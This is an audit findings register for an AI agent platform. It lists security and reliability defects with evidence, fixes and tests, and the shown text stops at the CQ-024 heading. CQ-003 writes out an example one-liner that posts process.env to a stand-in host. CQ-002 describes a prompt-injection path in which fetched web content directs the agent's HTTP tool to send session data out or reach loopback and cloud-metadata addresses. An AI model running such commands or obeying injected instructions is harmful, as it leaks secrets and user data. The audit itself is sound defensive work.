# 09 — Findings Register

Audit date: 2026-10-24 · Branch audited: `docs/audit-phase-3-a2a-plugins` @ `156c526` · Audit-only (no source modified).

This register is the single source of truth for finding IDs. Topic reports (02–08) reference these IDs instead of restating evidence.

Severity: CRITICAL / HIGH / MEDIUM / LOW / INFO. Confidence: HIGH = read in code or proven by executed check; MEDIUM = strong evidence, runtime impact not reproduced; LOW = hypothesis.

## Summary table

| ID | Severity | Category | Location | Issue | Impact | Effort | Confidence |
|---|---|---|---|---|---|---|---|
| CQ-001 | CRITICAL | Security | `packages/auth/src/index.ts:84-85` | JWT provider falls back to hard-coded secret `'dev-secret'` when `JWT_SECRET` unset | Forged tokens for any user when `auth.enabled: true` | S | HIGH |
| CQ-002 | HIGH | Security / Agent tools | `packages/tools/src/gateway.ts:25-27,51-52`, `packages/core/src/schemas/tool-gateway.schema.ts:12,27`, `packages/tools/src/builtins/network-tools.ts:9-34`, `web-fetch.ts:3-18` | `http_request` + `web_fetch` enabled by default, LLM-controlled URL/method/headers/body, no scheme/host allowlist or private-range block, full body buffered | SSRF to loopback API / cloud metadata, data exfiltration via prompt injection, memory blowup | M | HIGH |
| CQ-003 | HIGH | Security / Execution | `packages/execution/src/sandbox/process-sandbox.ts:35-38` | Process "sandbox" passes whole `process.env` to model-generated code; `networkEnabled:false` only sets an env var | All API keys, `JWT_SECRET`, `ANVIO_CREDENTIALS_PASSPHRASE` readable by executed code; no network isolation | S | HIGH |
| CQ-004 | HIGH | Agent reliability | `packages/agents/src/runtime.ts:318-330,350-362`, `tool-loop.ts:36-50`, `native-tool-loop.ts:14-30` | Tool results executed before an approval pause are dropped from the checkpoint | Side-effecting tools re-run after resume (duplicate writes/messages); model loses results | M | HIGH |
| CQ-005 | HIGH | Agent reliability | `packages/agents/src/runtime.ts:206-211,374-385`, `tool-loop.ts:68` | Hitting `maxToolIterations` (5) ends the turn silently as `completed` with stripped partial text | Users receive truncated/meaningless answers with no signal; loop exhaustion invisible in logs | S | HIGH |
| CQ-006 | HIGH | Node runtime / Cancellation | `runtime.ts:95-97,114-119,212-216,231-253`; `packages/models/src/providers/openai-compatible.provider.ts:327-340` | No `AbortSignal`/timeout propagated from runtime to providers/tools; `stop()` is a flag polled between chunks; stop requests for idle sessions persist and kill the next run | Hung provider or tool hangs the turn indefinitely; `/stop` cannot interrupt a tool; stale stop | M | HIGH |
| CQ-007 | HIGH | Concurrency | `packages/events/src/local-event-bus.ts:60-70`, `packages/channels/src/create-channels.ts:518`, `packages/channels/src/telegram.ts:274-300`, `packages/memory/src/filesystem-memory.ts:104-118` | In-process bus awaits handlers serially; inbound publish awaits the full agent run; no per-session serialization | Telegram poll loop blocked by one turn (head-of-line across all chats); concurrent turns on one session overwrite each other's history | L | MEDIUM |
| CQ-008 | HIGH | Channels lifecycle | `packages/channels/src/discord.ts:163-180,225-228`, `slack.ts:188-202` | `stop()` closes socket → `onclose` schedules `start()` again; rejected `start()` is `void`ed and ends reconnects forever; fixed 5 s, no backoff; Slack app token in WS URL; Discord heartbeat ignores sequence/ACK, no RESUME | Zombie reconnect after shutdown; permanent silent disconnect after one failed reconnect; token in URL; lost events | M | HIGH |
| CQ-009 | HIGH | Skills | `packages/skills/src/executor.ts:139-156` | Composable `skill:<slug>` steps recurse with no depth limit or cycle detection | A→B→A (incl. auto-drafted skills) loops until stack overflow / unbounded tool calls | S | HIGH |
| CQ-010 | HIGH | Orchestration | `packages/agents/src/orchestrator.ts:91-106,114-162,210-238,254-262` | Sub-agent `awaiting_approval` counted as completed; retries every error (incl. non-retryable) creating a new session per attempt; unbounded `Promise.all` fan-out and nested `subPlan` recursion; floating `void publishEvent` | Wrong plan status, orphan sessions, provider rate-limit storms, runaway nesting | M | HIGH |
| CQ-011 | HIGH | Architecture | `apps/cli/src/main.ts` (2883 lines), `packages/platform/src/index.ts:136-949`, `packages/platform/src/slash-commands-extras.ts:121-1399` | God modules: CLI single file with 42 command handlers importing 27 packages directly; `createPlatform` ~810-line function; `registerPlatformExtras` ~1280-line function with 47 commands | High regression risk, merge conflicts, untestable wiring; CLI bypasses the platform composition root | L | HIGH |
| CQ-012 | MEDIUM | Error handling | 149 `catch {` blocks (e.g. `packages/tools/src/gateway.ts:201-212`, `packages/platform/src/index.ts:1001-1014`, `runtime.ts:151-157,401-403,443-456`, `packages/storage/src/filesystem.ts:22-28`) | Errors swallowed with no log; malformed `tools/gateway.yaml` silently replaced by defaults; A2A boot failure invisible | Misconfiguration re-enables tools the operator disabled; features fail with no trace | M | HIGH |
| CQ-013 | MEDIUM | Security / FS boundary | `packages/storage/src/filesystem.ts:14-20`, `packages/tools/src/builtins/filesystem.ts:5-7`, `patch-file.ts:4-6`, `workspace-tools.ts:62` | Containment check `resolved.startsWith(root)` without separator, no `realpath`; copy-pasted in 4 places | `/ws` root admits `/ws-other/...`; symlinks inside workspace escape it | S | HIGH |
| CQ-014 | MEDIUM | Data integrity | `packages/storage/src/filesystem.ts:30-34` | Non-atomic `writeFile` for every storage write (sessions, state, credentials) | Crash/kill mid-write truncates JSON → session or credential file unreadable (and `read()` then returns `null`) | S | HIGH |
| CQ-015 | MEDIUM | Lifecycle / Shutdown | `apps/cli/src/main.ts:310-328`, `apps/worker/src/main.ts:19-26`, `packages/platform/src/unified-gateway.ts:174-185` | CLI calls `process.exit` immediately after starting async shutdown; worker handles SIGINT only and `main().catch(console.error)` exits 0; gateway closes event bus before stopping hook/automation engines, no drain or timeout | Lost flushes on Ctrl-C; containers (SIGTERM) killed hard; failed boot reported as success | S | HIGH |
| CQ-016 | HIGH | Dependencies | `pnpm-lock.yaml` (see 07/11) | `pnpm audit --prod`: 2 critical (next 15.5.24, proxy-addr 2.0.7), 12 high (MCP SDK 1.30.0, multer 2.2.0, zod, brace-expansion, source-map-js) | Known advisories in shipped dependency tree; reachability not verified | S–M | HIGH (presence) / LOW (exploitability) |
| CQ-017 | MEDIUM | Tooling | 20 of 40 `package.json` without `lint` script; `.github/workflows/ci.yml` | `pnpm lint` green covers ~half the code (platform, cli, harness, runtimes, integrations, execution, credentials, learning, a2a not linted); Prettier fails on 388 files and is not in CI | Lint/format rules are not actually enforced on the riskiest packages | S | HIGH |
| CQ-018 | MEDIUM | Observability | `packages/observability/src/logger.ts:24`; 384 `console.*` calls; `withSpan` used once (`gateway-worker.ts:157`) | Structured pino logger has zero adopters; no run/tool IDs in logs | Production failures cannot be traced across channel → run → tool | M | HIGH |
| CQ-019 | MEDIUM | LLM accounting | `packages/platform/src/index.ts:171-172,954-959` | Token audit records `provider: modelProvider.providerId` (platform default) instead of the provider that served the run | Spend/usage reports attribute OpenAI/Gemini/route traffic to Anthropic | S | HIGH |
| CQ-020 | MEDIUM | Events | `runtime.ts:126-127,218-226,277-278`; `packages/platform/src/index.ts:475-482`; `gateway-worker.ts:215-225` | Every progress phase emitted twice: via yielded chunk and via `onProgress`, the latter hard-coded `channel: 'cli'` | Duplicate events, wrong channel data for subscribers, extra serial handler work | S | HIGH |
| CQ-021 | MEDIUM | Memory | `packages/memory/src/filesystem-memory.ts:96-118`, `provider-factory.ts:74-112` | Each `storeConversation` re-stores last 2 messages to long-term (also on unfinished turns); `getContext` loads the whole session long-term set each turn though the runtime ignores it; two near-identical implementations | Duplicate memory rows; O(n) growing IO per turn; fixes must be made twice | M | HIGH |
| CQ-022 | MEDIUM | Reliability | `packages/models/src/circuit-breaker.ts:5-7,47-58` | Half-open state admits every caller; doc promises "ONE probe" | Recovering provider receives a full burst; doc misleads maintainers | S | HIGH |
| CQ-023 | MEDIUM | Type safety | `packages/agents/src/run-checkpoint.ts:12-16`, `runtime.ts:521` | Checkpoint read from persisted session metadata with unchecked cast; written via `as unknown as` | Corrupt/old checkpoint crashes resume deep in the loop with an unhelpful error | S | HIGH |
| CQ-024 | MEDIUM | Dead code / Tier rule | `packages/tool-bus/` (0 importers), `packages/tools/src/legacy.ts:1-31`, `packages/tools/src/index.ts:1` | `tool-bus` policy layer unused while its doc claims runtime enforcement; unused Postgres audit logger re-exported from `@anvio/tools` pulls `@anvio/db` (drizzle + postgres) into Level-1 import graph | Misleading security story; violates "no Level 3+ dependency in Level-1 paths" | S | HIGH |
| CQ-025 | LOW | Duplication | `tool-loop.ts:24-81` vs `native-tool-loop.ts:6-55` | `approvalSummaryFromResult` copied verbatim; two parallel tool-round implementations | Divergent fixes (CQ-004 must be fixed twice) | S | HIGH |
| CQ-026 | LOW | Readability | `runtime.ts:502`, `tool-loop.ts:4,68`, `network-tools.ts:16,32`, `discord.ts:171`, `slack.ts:195` | Magic numbers (24 h approval TTL, 5 iterations, 8 000/32 000 chars, 5 s reconnect) scattered, partly env-configurable via ad-hoc `process.env` reads | Tuning requires code archaeology | S | HIGH |
| CQ-027 | LOW | Node runtime | `packages/runtimes/src/ssh/ssh-runtime.ts:36-72`, `singularity/singularity-runtime.ts:59-90` | `async` methods implemented with `spawnSync`, no timeout | Blocks event loop, can hang forever; today only CLI callers (`apps/cli/src/main.ts:1546-1573`) | S | HIGH |
| CQ-028 | MEDIUM | Testing | see 08 | No unit tests for `auth`, `credentials`, `storage`, `execution`, `hooks`, `workflows`, `cli`; no tests for iteration cap, stop, approval mid-batch, skill recursion, channel stop/reconnect | Security-critical and lifecycle code unguarded against regression | M | HIGH |
| CQ-029 | LOW | Config / Runtime | `package.json` engines `>=20`, `.github/workflows/ci.yml` (`node-version: 20`) | CI pinned to Node 20 (EOL 2026-04-30); local verification ran on Node 24.21 | CI tests on an unsupported runtime; prod/CI drift | S | HIGH |
| CQ-030 | LOW | Config | `packages/platform/src/index.ts:165-173,1090-1111` | With no model key, mock provider is registered for every provider id; runs "complete" with zero usage | Misconfigured daemon looks healthy (text is labeled, status is not) | S | HIGH |
| CQ-031 | MEDIUM | Node runtime | `packages/credentials/src/encrypted-store.ts:16,29` | `scryptSync` key derivation on every encrypt/decrypt | Event loop blocked for every credential read under pool rotation | S | MEDIUM |
| CQ-032 | MEDIUM | Tool gateway | `packages/tools/src/gateway.ts:218-220,268-277` | `mergeContext` mutates shared context via `Object.assign`; an `onToolCompleted` hook error surfaces as a failed call after the tool already succeeded | Cross-session context bleed; model retries a completed side effect | S | MEDIUM |
| CQ-033 | MEDIUM | Security / Execution | `packages/tools/src/builtins/index.ts:129-150,171-194` | `execute_code` falls back to in-process `new Function(code)` when no `codeExecutor` is in context; `executeCode` exported publicly | Model code runs inside the host process with `process`/`fetch` access and no timeout (an infinite loop freezes the daemon). Platform always injects an executor; reachable via `anvio tools test` (`apps/cli/src/main.ts:2049-2066`) and any external consumer | S | HIGH |
| CQ-034 | HIGH | Security / Skills | `packages/skills/src/executor.ts:179-195` | Skill step `condition` strings evaluated with `new Function` in the host process; doc comment claims "only context vars are in scope" (globals such as `process` are reachable) | Any imported/installed or learning-drafted skill YAML can execute arbitrary host code on run; exceptions silently become `false` | S | HIGH |

Totals: **CRITICAL 1 · HIGH 12 · MEDIUM 16 · LOW 5 · INFO 0** (34 findings).

---

## Detailed findings

### CQ-001 — JWT secret falls back to `'dev-secret'` (CRITICAL, HIGH confidence)

- **Symbols:** `createAuthProvider`, `JwtAuthProvider`
- **Evidence:** `packages/auth/src/index.ts:84-85`
  ```ts
  case 'jwt':
    return new JwtAuthProvider(options?.jwtSecret ?? 'dev-secret', defaultUserId);
  ```
  Caller `packages/platform/src/index.ts:142-145` passes `process.env.JWT_SECRET` unchecked. No other code asserts the variable exists (grep for `JWT_SECRET` returns only this caller).
- **Why it matters:** an operator who flips `auth.enabled: true` believes the API/gateway is protected. Anyone can sign `{sub: "<victim>"}` with `dev-secret` and act as any user. `assertSafeBinding` (unified-gateway) only checks `auth.enabled`, so it also passes.
- **Scenario:** gateway bound to `0.0.0.0` with auth enabled, `JWT_SECRET` missing in the container env → full unauthenticated access, including tool execution.
- **Recommendation:** throw at `createAuthProvider` when `config.provider === 'jwt'` and no secret (or secret shorter than 32 bytes). Pin `algorithms: ['HS256']` in `jwt.verify`.
  ```ts
  // After
  case 'jwt': {
    const secret = options?.jwtSecret;
    if (!secret || secret.length < 32) {
      throw new AnvioError('CONFIG_ERROR', 'auth.provider=jwt requires JWT_SECRET (>= 32 chars)');
    }
    return new JwtAuthProvider(secret, defaultUserId);
  }
  ```
- **Benefit:** closes auth bypass. **Effort:** S. **Regression risk:** LOW — only breaks setups that were insecure; document in CHANGELOG.
- **Tests:** unit — missing secret throws; token signed with `dev-secret` rejected; valid token accepted.

### CQ-002 — Network tools on by default with no egress policy (HIGH, HIGH)

- **Symbols:** `DEFAULT_TOOL_GATEWAY_YAML`, `toolGatewaySchema`, `httpRequest`, `webFetch`
- **Evidence:** defaults `web_fetch: enabled: true`, `http_request: enabled: true` (`gateway.ts:25-27,51-52`; schema default `{ enabled: true }` at `tool-gateway.schema.ts:27`). `httpRequest` forwards model-supplied `url`, `method`, `headers`, `body` straight to `fetch` (`network-tools.ts:17-22`) and calls `res.text()` before slicing to 32 000 chars (`:23,32`). No host/scheme/IP filtering anywhere in `builtins/`. Neither tool is behind approval (only MCP first-use and harness `request_approval` produce `pending_approval`).
- **Why it matters:** this is the trust boundary between LLM output and executable action. Content fetched by `web_fetch` can carry prompt injection that instructs `http_request` to `POST` session data to an attacker, or to hit `http://127.0.0.1:3000/api/*` (the unauthenticated loopback gateway) or `169.254.169.254`.
- **Recommendation:** (1) default `http_request` to disabled; (2) add a shared `assertEgressAllowed(url)` guard — http/https only, resolve DNS and block loopback/link-local/private ranges unless allow-listed in `gateway.yaml`; (3) stream the body with a byte cap instead of `res.text()`; (4) optionally require approval for non-GET.
- **Benefit:** removes SSRF/exfil channel. **Effort:** M. **Regression risk:** MEDIUM — agents relying on default `http_request` need config; ship allowlist config first.
- **Tests:** guard unit tests (127.0.0.1, `[::1]`, `0x7f000001`, DNS rebinding via hostname resolving to private IP, `file://`); body cap test with a 10 MB response.

### CQ-003 — Process sandbox leaks secrets and does not isolate network (HIGH, HIGH)

- **Evidence:** `process-sandbox.ts:35-38`
  ```ts
  env: { ...process.env, ...options.env, ANVIO_NETWORK: options.networkEnabled ? '1' : '0' },
  ```
  Docker mode does honour `--network none` (`:135`), the process mode does not. Also `stdout += chunk` is unbounded (`:46`) and `child.kill('SIGKILL')` kills only the direct child, not a process group.
- **Scenario:** `execute_code`/`run_shell` enabled → model runs `env` or `node -e "fetch('https://x', {body: JSON.stringify(process.env)})"`.
- **Recommendation:** start from an allow-listed env (`PATH`, `HOME`, `LANG`, `TMPDIR` + explicit `options.env`); spawn `detached: true` and kill `-pid`; cap captured output; document that process mode provides no network isolation and refuse `networkEnabled:false` in process mode (or fall back to docker).
- **Effort:** S. **Regression risk:** LOW–MEDIUM (scripts that relied on inherited env). **Tests:** sandboxed `env` output must not contain `ANTHROPIC_API_KEY`; grandchild killed on timeout; 50 MB stdout capped.

### CQ-004 — Pre-approval tool results discarded (HIGH, HIGH)

- **Evidence:** `executeParsedToolCalls` returns `toolMessages` accumulated before the pending call (`tool-loop.ts:36-50`); the runtime builds the checkpoint from `messages` only (`runtime.ts:318-330`, `350-362`), so `toolRound.toolMessages` and the assistant message that requested the calls are never persisted. On resume (`runtime.ts:189-196`) only an approval sentence is appended. Calls after the pending one in the same batch are never executed and the model is not told.
- **Scenario:** model emits `[edit_file A, send_message B, request_approval C]`. A and B run, C pauses. After approval the model, unaware A/B ran, emits them again → file edited twice, message sent twice.
- **Recommendation:** include `assistant` turn + completed `toolMessages` in the checkpoint; for skipped calls append a synthetic "not executed (awaiting approval)" tool message. Fix once by merging both loops (CQ-025).
  ```ts
  // After (sketch, inside pendingApproval branch)
  const pausedMessages = [
    ...messages,
    { role: 'assistant', content: iterationContent, toolCalls: iterationToolCalls },
    ...toolRound.toolMessages,
  ];
  checkpoint: buildCheckpoint(pausedMessages, iteration + 1, lastIterationContent, usage, pending)
  ```
- **Effort:** M. **Regression risk:** MEDIUM (native-tool providers require every `tool_use` to have a `tool_result`; the synthetic result handles this). **Tests:** scripted provider emits 3 calls with approval on #2 → assert #1 runs once across pause/resume and checkpoint contains its result.

### CQ-005 — Iteration cap exhaustion is silent (HIGH, HIGH)

- **Evidence:** loop `for (iteration < maxIterations)` (`runtime.ts:211`) exits after executing the 5th round's tools; then `fullContent = stripToolCalls(lastIterationContent)` (`:374-376`) and `done` is yielded with status completed. No progress/notice, no log.
- **Recommendation:** detect exit-by-cap (`iteration === maxIterations` with tools still requested), append a visible notice like the existing `TRUNCATION_NOTICE`, emit a `progress` phase and a metric; optionally run one final no-tools model call to summarize.
- **Effort:** S. **Tests:** scripted provider that always calls a tool → assert notice present and `maxToolIterations` respected.

### CQ-006 — No cancellation or timeout propagation (HIGH, HIGH)

- **Evidence:** `ModelChatRequest` supports `signal` (providers forward it: `anthropic.provider.ts:119,152`, `gemini.provider.ts:241`, `openai-compatible.provider.ts:152,209,340`) but `runtime.ts:231-238` never sets one. `openai-compatible` `fetch` has no timeout. `stop()` adds to a `Set` (`:95-97`) checked only at loop boundaries and per received chunk; a stalled stream or long tool call is uninterruptible. A `stop()` for a session that is not running is never cleared until that session's next run, which then immediately errors (`:115-118`).
- **Recommendation:** per-run `AbortController` stored in a `Map<sessionId, AbortController>`; `stop()` aborts it (no-op when absent); pass `signal` to provider requests and to `RuntimeToolPort.call` ctx; add a default per-request idle timeout (`AbortSignal.any([run.signal, AbortSignal.timeout(n)])`).
- **Effort:** M. **Regression risk:** MEDIUM. **Tests:** stalled provider + `stop()` resolves within 100 ms; `stop()` on idle session does not affect next run.

### CQ-007 — Serial event dispatch and no per-session serialization (HIGH, MEDIUM)

- **Evidence:** `LocalEventBus.dispatch` awaits each handler in sequence (`local-event-bus.ts:60-70`). Channel inbound handler awaits `eventBus.publish(AGENT_RUN_REQUESTED…)` (`create-channels.ts:518`), whose subscriber runs the whole turn (`gateway-worker.ts:153-…`). Telegram's poll loop awaits `handleUpdate` per update (`telegram.ts:287-289`) → one long turn stalls every chat on that bot. Slack/Discord use `runGuarded` (not awaited) so two messages in one thread run concurrently; both read history then `setMessages` the full array (`filesystem-memory.ts:109`) → last writer wins.
- **Confidence MEDIUM:** call chain read end-to-end; latency effect not reproduced under load. NATS mode not inspected.
- **Recommendation:** decouple inbound from run completion (enqueue, don't await run); add a keyed async mutex / per-session queue in the gateway worker so turns for one session serialize while different sessions run in parallel (bounded).
- **Effort:** L. **Tests:** two concurrent inbound messages same session → history contains both turns; Telegram poll continues while a turn is running.

### CQ-008 — Channel reconnect/stop lifecycle (HIGH, HIGH)

- **Evidence:** `discord.ts:169-172` / `slack.ts:193-196`: `onclose = () => setTimeout(() => void this.start(), 5000)`. `stop()` (`discord.ts:176-181`, `slack.ts:199-203`) calls `ws.close()` without detaching `onclose` → reconnect after stop. If `start()` rejects (`/gateway/bot` 5xx), the rejection is voided and no new `onclose` exists → bot stays offline until restart. Slack builds `wss://wss-primary.slack.com/link/?app_token=${appToken}` (`slack.ts:189`) — Socket Mode normally requires `apps.connections.open` to obtain a ticket URL; the secret app token ends up in a URL (logs/proxies). Discord heartbeat sends `{op:1, d:null}` (`:226-228`) with no sequence, no ACK check, no RESUME.
- **Confidence:** HIGH for stop/reconnect logic; MEDIUM that the Slack URL is non-functional (not run against Slack).
- **Recommendation:** `private stopping = false`; in `stop()` set it and null `onclose`; reconnect with capped exponential backoff + jitter inside a loop that catches `start()` errors; Slack: call `apps.connections.open` with `Authorization: Bearer`; Discord: track `s`, ACK (op 11), RESUME.
- **Effort:** M. **Tests:** fake WebSocket — `stop()` → no `start()` after 5 s; `start()` rejecting twice then succeeding → connected.

### CQ-009 — Unbounded composable-skill recursion (HIGH, HIGH)

- **Evidence:** `executor.ts:140-156` resolves `skill:<slug>` and calls `executeSkill` recursively with the same `resolveSkill`, no depth counter, no visited set. Skills can be auto-drafted by the learning loop (`packages/learning/src/skill-evolution.ts:88,241`).
- **Recommendation:** thread `callStack: string[]` through `executeSkill`; throw `SkillStepError('SKILL_CYCLE')` when slug repeats or depth > 8.
- **Effort:** S. **Tests:** A→B→A raises `SKILL_CYCLE`; depth 9 chain rejected.

### CQ-010 — Orchestrator status, retry and concurrency (HIGH, HIGH)

- **Evidence:** `orchestrator.ts:127-136` records `status: 'completed'` regardless of `result.status` (may be `awaiting_approval`). Retry branch (`:142-146`) retries every exception, including `loadAgent` not-found/validation, and each attempt calls `sessions.create` (`:117-125`) → orphan sessions. `runParallelWaves` (`:210-238`) runs all ready tasks with `Promise.all`, unbounded. `task.subPlan` recurses (`:91-92`) without depth limit. `finalize` uses `void this.deps.publishEvent(...)` (`:254-262`) — rejection becomes an unhandled rejection (logged by process guard). Indentation of `return this.finalize(...)` at `:199` is broken (Prettier would flag).
- **Recommendation:** map `awaiting_approval` to a distinct task status; classify errors with `readProviderErrorDetails`/`AnvioError` and retry only retryable ones; reuse the session across attempts; add `maxConcurrency` (default 4) and `maxDepth`; `await` or `.catch` the publish.
- **Effort:** M. **Tests:** sub-agent awaiting approval → plan `partial`/`awaiting`; non-retryable error → 1 attempt; 20 parallel tasks never exceed concurrency 4.

### CQ-011 — God modules (HIGH, HIGH)

- **Evidence:**
  - `apps/cli/src/main.ts`: 2883 lines, `switch` dispatcher at `:60+`, 42 `cmd*` functions, imports from 27 `@anvio/*` packages (credentials, execution, runtimes, voice…) — contradicts CLAUDE.md "apps never assemble subsystems themselves, they call into platform".
  - `packages/platform/src/index.ts`: `createPlatform` spans `:136` to `~:949` (≈810 lines) wiring 20+ subsystems plus inline event handlers (learning, token audit, draft prompts) and inline helpers.
  - `packages/platform/src/slash-commands-extras.ts`: `registerPlatformExtras` spans `:121-1399` registering 47 commands as closures.
- **Why it matters:** unrelated changes collide in the same function; closures capture dozens of locals so no piece can be unit-tested; the inline session-completed handler (`index.ts:~940-1000`) mixes token accounting, learning and channel I/O.
- **Recommendation (incremental, no new abstraction layer):** (1) move each CLI command group to `apps/cli/src/commands/<group>.ts` exporting `run(sub: string[])`; keep the switch; (2) extract platform event-subscription handlers into named functions in `platform/src/handlers/` that take explicit deps; (3) split slash extras by domain (`mutations`, `drafts`, `sessions`, …), each `register*(registry, deps)`. Move CLI subsystem construction behind platform helpers when a command duplicates platform wiring.
- **Effort:** L (but each step is S and independent). **Regression risk:** LOW per step if moved verbatim. **Tests:** existing integration tests + new unit test per extracted handler.

### CQ-012 — Silent `catch {}` (MEDIUM, HIGH)

- **Evidence:** 149 occurrences in non-spec source (platform 19, learning 13, tools 12, skills 11, runtimes 11, workspace 10, harness 9, cli 9, integrations 8, agents 5). The lint rule `no-empty: allowEmptyCatch:false` is satisfied by a comment, so it does not help. Most harmful instances:
  - `ToolGateway.load` (`gateway.ts:203-211`): any error — including a YAML syntax error or schema violation — returns the default spec, which enables `http_request` (ties to CQ-002).
  - A2A boot (`platform/src/index.ts:1001-1014`): `a2a.enabled: true` but server silently absent.
  - `FilesystemStorageProvider.read` (`storage/src/filesystem.ts:22-28`): EACCES/EISDIR/traversal treated as "missing".
  - Agent skill load, goal resolver, trigger matching, soul load (`runtime.ts:151-157,443-456,469-476`): agent runs with a different prompt than configured, no trace.
- **Recommendation:** distinguish "missing" (`ENOENT`) from "broken"; rethrow or log broken config at `warn` with the file path. A tiny helper `isNotFound(err)` covers most sites. Fail fast for config files the operator authored.
- **Effort:** M (mechanical, many sites). **Tests:** malformed gateway.yaml → boot error naming the file.

### CQ-013 — Path containment check (MEDIUM, HIGH)

- **Evidence:** `storage/src/filesystem.ts:15-17`, `tools/src/builtins/filesystem.ts:5-7`, `patch-file.ts:4-6`, `workspace-tools.ts:62` all use `resolved.startsWith(path.resolve(root))`.
- **Recommendation:** one shared helper:
  ```ts
  export function resolveInside(root: string, rel: string): string {
    const base = path.resolve(root);
    const target = path.resolve(base, rel);
    const relative = path.relative(base, target);
    if (relative.startsWith('..') || path.isAbsolute(relative)) throw new Error(`Path escapes root: ${rel}`);
    return target; // + fs.realpath check for existing paths when following symlinks matters
  }
  ```
- **Effort:** S. **Tests:** `../ws-evil/x` with root `/tmp/ws` rejected; symlink to `/etc` rejected for `file_read`.

### CQ-014 — Non-atomic storage writes (MEDIUM, HIGH)

- **Evidence:** `fs.writeFile(filePath, data)` directly (`storage/src/filesystem.ts:33`).
- **Recommendation:** write to `${file}.${pid}.tmp` then `fs.rename` (atomic on same filesystem).
- **Effort:** S. **Tests:** simulated failure between write and rename leaves old file intact.

### CQ-015 — Shutdown paths (MEDIUM, HIGH)

- **Evidence:** `apps/cli/src/main.ts:315-327` — `run()` starts `shutdown()` with `void` and the next line calls `process.exit(130)`, so async cleanup never completes. `apps/worker/src/main.ts:19-24` only SIGINT; `:27` `main().catch(console.error)` leaves exit code 0 on boot failure. `unified-gateway.ts:174-185` closes `eventBus` before `hookEngine`/`automationEngine` stop and never waits for in-flight runs; any step rejecting aborts the rest.
- **Recommendation:** shared `gracefulShutdown(steps, {timeoutMs})` in platform: run steps in reverse dependency order with `Promise.allSettled` per stage, a hard timeout, then `process.exit(code)`; handle SIGINT+SIGTERM everywhere; `main().catch((e) => { console.error(e); process.exit(1); })`.
- **Effort:** S. **Tests:** spawn worker, send SIGTERM, assert exit 0 and `stopAll` called.

### CQ-016 — Vulnerable dependencies (HIGH, HIGH presence / LOW exploitability)

See `07-security-dependencies.md` §4 for the full table. Notable: `next@15.5.24` (GHSA-2464-fhr4-w9xw, critical, patched 15.5.28) in `apps/web`; `proxy-addr@2.0.7` (GHSA-jqcg-44mw-7w3h, critical) via `@a2a-js/sdk`; `@modelcontextprotocol/sdk@1.30.0` (3 high, patched 1.32.0); `multer@2.2.0` (3 high, patched 2.3.0) — the existing override `multer@<2.2.0: >=2.2.0` pins exactly the vulnerable version; `brace-expansion` override `>=5.0.9` resolves to 5.0.9, still vulnerable (<5.0.11). Reachability (e.g. whether the A2A server path uses `proxy-addr` trust settings) was not verified.
- **Recommendation:** bump direct deps (`next`, `@modelcontextprotocol/sdk`, `@a2a-js/sdk`, `@nestjs/*`), raise override floors to patched versions, add `pnpm audit --prod --audit-level=high` to CI.
- **Effort:** S–M. **Regression risk:** MEDIUM for `next`/MCP SDK minor bumps — run full test suite.

### CQ-017 — Lint and format coverage (MEDIUM, HIGH)

- **Evidence:** packages without `lint` script: `apps/cli`, `apps/gateway`, `apps/worker`, `a2a`, `acp`, `auth`, `credentials`, `execution`, `harness`, `integrations`, `knowledge`, `learning`, `platform`, `runtimes`, `soul-gate`, `storage`, `voice`, `workflows`, `workspace` (and `apps/web` uses `next lint`). `pnpm format:check` reports 388 files; CI (`.github/workflows/ci.yml`) runs lint/build/typecheck/test only.
- **Recommendation:** add `"lint": "eslint src/"` to every package (fix fallout incrementally with `--max-warnings` baseline); add `format:check` to CI after one `prettier --write` commit.
- **Effort:** S (+ fallout M).

### CQ-018 — Logging without structure or correlation (MEDIUM, HIGH)

- **Evidence:** `createLogger` (pino) defined in `observability/src/logger.ts:24`, imported by no other package; 384 `console.*` calls; `withSpan` used once (`gateway-worker.ts:157`); log lines carry ad-hoc prefixes (`[gateway]`, `[Telegram]`) but no `runId`, `sessionId` field convention or tool call id.
- **Recommendation:** adopt `createLogger('<pkg>:<module>')` starting with runtime, gateway-worker, tool gateway, channels; bind `{ sessionId, runId, agentId, channel }` via `logger.child` at turn start; wrap model call and each tool call in `withSpan`.
- **Effort:** M. **Tests:** `setRootLogger` test hook already exists — assert child bindings.

### CQ-019 — Wrong provider in token audit (MEDIUM, HIGH)

- **Evidence:** `modelProvider` = `getOptional('anthropic') ?? first()` (`platform/src/index.ts:171-172`); recorded at `:959` for every run regardless of agent provider or router failover.
- **Recommendation:** have the runtime include `providerId`/`model` actually used on the `done` chunk (router already stamps chunks in `drain`), carry it on `AGENT_RUN_COMPLETED`, record that.
- **Effort:** S. **Tests:** agent with `provider: openai` → audit row provider `openai`.

### CQ-020 — Duplicate progress events (MEDIUM, HIGH)

- **Evidence:** runtime yields `progress` and calls `deps.onProgress` for the same phase (`runtime.ts:126-127`, `218-226`, `277-278`). Platform's `onProgress` publishes `AGENT_RUN_PROGRESS` with `channel: 'cli'` (`index.ts:475-482`); the gateway worker publishes the yielded chunk again with the real channel (`gateway-worker.ts:215-225`).
- **Recommendation:** keep one mechanism (the yielded chunk); delete `onProgress` from `AgentRuntimeDeps` or make the platform callback a no-op for streamed runs.
- **Effort:** S.

### CQ-021 — Memory write duplication and growth (MEDIUM, HIGH)

- **Evidence:** `storeConversation` stores `messages.slice(-2)` as long-term entries each call (`filesystem-memory.ts:110-117`, `provider-factory.ts:105-112`); called on success and in the runtime `finally` for unfinished turns (`runtime.ts:394-399`), so the same user message is stored twice after an error then retry. `getContext` reads `longTerm.getBySession` (all entries) every turn (`filesystem-memory.ts:97-100`) while the runtime only uses `shortTerm` (`runtime.ts:198-199`).
- **Recommendation:** store long-term entries keyed by message id/hash (idempotent); make `getContext` lazy or bounded; consolidate the two implementations behind one function.
- **Effort:** M.

### CQ-022 — Circuit breaker half-open (MEDIUM, HIGH)

- **Evidence:** doc `circuit-breaker.ts:6` "ONE probe call is permitted"; `canAttempt` returns `true` for every caller while `half-open` (`:51`).
- **Recommendation:** add `probeInFlight` flag set on the transition to half-open; other callers get `false` until `recordSuccess/recordFailure`.
- **Effort:** S. **Tests:** two `canAttempt` calls after cooldown → `true`, `false`.

### CQ-023 — Unvalidated checkpoint (MEDIUM, HIGH)

- **Evidence:** `readRunCheckpoint` returns `raw as AgentRunCheckpoint` if it is any object (`run-checkpoint.ts:12-16`); written with `as unknown as Record<string, unknown>` (`runtime.ts:521`). The codebase already uses zod in `@anvio/core`.
- **Recommendation:** zod schema for `AgentRunCheckpoint` + a `version` field; on parse failure, start a fresh turn with a user-visible notice.
- **Effort:** S.

### CQ-024 — Dead `tool-bus` package, Postgres in Level-1 graph (MEDIUM, HIGH)

